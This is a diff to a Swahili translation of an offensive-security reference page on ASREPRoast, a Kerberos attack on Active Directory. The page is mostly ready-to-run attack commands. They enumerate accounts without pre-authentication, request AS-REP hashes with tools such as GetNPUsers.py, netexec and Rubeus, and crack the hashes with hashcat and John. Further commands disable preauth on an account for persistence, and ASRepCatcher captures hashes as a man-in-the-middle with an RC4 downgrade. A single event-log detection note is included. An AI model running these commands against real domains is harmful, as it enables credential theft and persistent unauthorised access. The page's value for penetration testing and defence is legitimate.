@@ -4,15 +4,15 @@
 
 ## ASREPRoast
 
-ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **sifa ya lazima ya awali ya uthibitishaji wa Kerberos**. Kimsingi, udhaifu huu unaruhusu washambuliaji kuomba uthibitishaji kwa mtumiaji kutoka kwa Msimamizi wa Kikoa (DC) bila kuhitaji nenosiri la mtumiaji. DC kisha inajibu kwa ujumbe uliofichwa kwa kutumia funguo zilizotokana na nenosiri la mtumiaji, ambazo washambuliaji wanaweza kujaribu kuzivunja nje ya mtandao ili kugundua nenosiri la mtumiaji.
+ASREPRoast ni shambulio la usalama linalotumia watumiaji wasiokuwa na **Kerberos pre-authentication required attribute**. Kwa msingi, udhaifu huu unawawezesha wadukuzi kuomba authentication kwa mtumiaji kutoka kwa Domain Controller (DC) bila ya kuhitaji nenosiri la mtumiaji. DC kisha inajibu kwa ujumbe uliosimbwa kwa ufunguo uliotokana na nenosiri la mtumiaji, ambao wadukuzi wanaweza kujaribu kuvunja kwa njia isiyokuwa mtandaoni ili kugundua nenosiri la mtumiaji.
 
-Mahitaji makuu ya shambulio hili ni:
+Mahitaji makuu kwa shambulio hili ni:
 
-- **Ukosefu wa awali ya uthibitishaji wa Kerberos**: Watumiaji wa lengo hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
-- **Muunganisho na Msimamizi wa Kikoa (DC)**: Washambuliaji wanahitaji ufikiaji wa DC ili kutuma maombi na kupokea ujumbe uliofichwa.
-- **Akaunti ya kikoa ya hiari**: Kuwa na akaunti ya kikoa kunawawezesha washambuliaji kutambua kwa ufanisi watumiaji walio hatarini kupitia maswali ya LDAP. Bila akaunti kama hiyo, washambuliaji lazima wahisi majina ya watumiaji.
+- **Lack of Kerberos pre-authentication**: Watumiaji lengwa hawapaswi kuwa na kipengele hiki cha usalama kimewezeshwa.
+- **Connection to the Domain Controller (DC)**: Wadukuzi wanahitaji ufikiaji kwa DC kutuma maombi na kupokea ujumbe uliosimbwa.
+- **Optional domain account**: Kuwa na akaunti ya domain kunawawezesha wadukuzi kutambua watumiaji walio hatarini kwa ufanisi zaidi kupitia LDAP queries. Bila akaunti kama hiyo, wadukuzi lazima wakisie majina ya watumiaji.
 
-#### Kuorodhesha watumiaji walio hatarini (hitaji akreditif za kikoa)
+#### Kuhesabu watumiaji walio hatarini (need domain credentials)
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -33,16 +33,22 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> AS-REP Roasting na Rubeus itazalisha 4768 yenye aina ya usimbaji ya 0x17 na aina ya preauth ya 0.
+> AS-REP Roasting with Rubeus itatengeneza 4768 yenye aina ya usimbuaji 0x17 na preauth type of 0.
 
-### Kupasua
+#### Mistari mifupi ya haraka (Linux)
+
+- Tambua malengo yanayowezekana kwanza (kwa mfano, kutoka leaked build paths) kwa kutumia Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- Piga AS-REP ya mtumiaji mmoja hata ukiwa na nenosiri **bila** ukitumia `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec pia inaonyesha LDAP signing/channel binding posture).
+- Crack with `hashcat out.asreproast /path/rockyou.txt` – inaigundua kiotomatiki **-m 18200** (etype 23) kwa AS-REP roast hashes.
+
+### Cracking
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
-### Persistence
+### Uendelevu
 
-Lazimisha **preauth** isiyohitajika kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika mali):
+Weka **preauth** isihitajike kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika properties):
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -50,10 +56,10 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash:Using Linux
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
 ```
-## ASREProast bila hati
+## ASREProast without credentials
 
-Mshambuliaji anaweza kutumia nafasi ya mtu katikati kukamata pakiti za AS-REP wakati zinapopita kwenye mtandao bila kutegemea kuondolewa kwa awali kwa uthibitisho wa Kerberos. Hivyo inafanya kazi kwa watumiaji wote kwenye VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inatufanya tuweze kufanya hivyo. Zaidi ya hayo, chombo hiki kinawalazimisha vituo vya wateja kutumia RC4 kwa kubadilisha mazungumzo ya Kerberos.
+Mshambuliaji anaweza kutumia nafasi ya man-in-the-middle kukamata AS-REP packets zinapopita kwenye mtandao bila kutegemea kwamba Kerberos pre-authentication imezimwa. Hivyo basi inafanya kazi kwa watumiaji wote kwenye VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) inatuwezesha kufanya hivyo. Zaidi ya hayo, zana hiyo inalazimisha client workstations kutumia RC4 kwa kubadilisha Kerberos negotiation.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -67,6 +73,7 @@ ASRepCatcher listen
 ## Marejeo
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 ---
 
